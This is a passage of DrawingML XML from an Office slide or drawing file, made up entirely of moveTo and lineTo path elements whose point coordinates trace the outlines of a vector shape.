                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="1138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="331"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="184"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6273" y="2678"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6273" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="3008"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="3302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6127" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6127" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6127" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="3339"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="3008"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6347" y="2678"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="3265" y="7887"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3082" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2862" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2679" y="8401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2972" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3265" y="7887"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4806" y="9501"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4513" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="10015"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5320" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5430" y="10381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="10528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="10675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5540" y="10748"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="10748"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="10711"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="10601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5760" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="9501"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4879" y="8547"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5136" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6714" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="10748"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6934" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6934" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6934" y="11665"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6934" y="11995"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6824" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="13499"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="13793"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="13939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="14050"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="14270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5540" y="14526"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="14857"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="14967"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="15187"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="15187"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="14857"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="14636"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="14490"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="14380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="14270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="14160"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="14123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="14123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="14160"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="14233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4513" y="14343"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="14453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4513" y="14526"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="14783"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="15003"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="15260"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="15333"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293" y="15370"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="15480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="15590"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="15333"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="14746"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="14673"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="14600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="14526"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="14490"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="14453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="14453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="14490"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3779" y="14563"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3486" y="15150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="15407"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="15663"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2899" y="15700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="15627"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="15407"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="15187"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3119" y="14893"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3265" y="14600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="14600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3375" y="14526"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="14490"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="14380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="14343"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="14270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="14233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="14196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3155" y="14196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="14233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="14380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="14673"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="15077"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="15443"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2202" y="15553"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="15370"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="15187"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="15077"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1872" y="14967"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="14563"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="14196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="13976"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2789" y="13756"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2789" y="13683"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="13609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2642" y="13609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2422" y="13719"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="13866"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="14233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="14673"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="14820"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="15003"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1138" y="14636"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="14306"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="13939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="13132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="13059"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="12949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2202" y="12912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="12912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1982" y="12949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="13646"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="14013"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="14380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="14050"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="698" y="13719"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1358" y="13096"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1872" y="12436"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="12362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="12289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1872" y="12215"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="12142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1688" y="12105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="12105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1065" y="12729"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="808" y="13022"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="13353"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="12876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="771" y="12656"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="12399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="12069"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="11775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="11665"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="11592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="11518"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1358" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1175" y="11629"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="11775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="771" y="12105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="12436"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="734" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="808" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1138" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1248" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1358" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="10711"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="10675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1175" y="10675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="10748"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1065" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="954" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="11042"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="698" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="954" y="10675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="10565"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="10345"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="10345"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2092" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2422" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3009" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="8547"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="3265" y="7484"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3009" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2789" y="7704"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2422" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2092" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1872" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1688" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1872" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1688" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1248" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1065" y="10015"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588" y="10381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="441" y="10528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="331" y="10711"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="221" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="147" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="11592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="12069"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="12546"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="13022"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="147" y="13463"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="258" y="13903"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="404" y="14270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588" y="14673"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="15040"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="15333"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="15627"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="15847"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="16030"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="16140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2789" y="16177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3009" y="16177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3486" y="16140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="16030"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="15884"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4696" y="15700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="15517"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5430" y="15297"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="15150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="15003"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="14490"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="14270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6714" y="14160"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="14013"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="13683"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="13316"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="12949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="12252"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="11518"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="11152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7154" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="9794"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="8987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="8401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3486" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3009" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2789" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2202" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="8877"/>
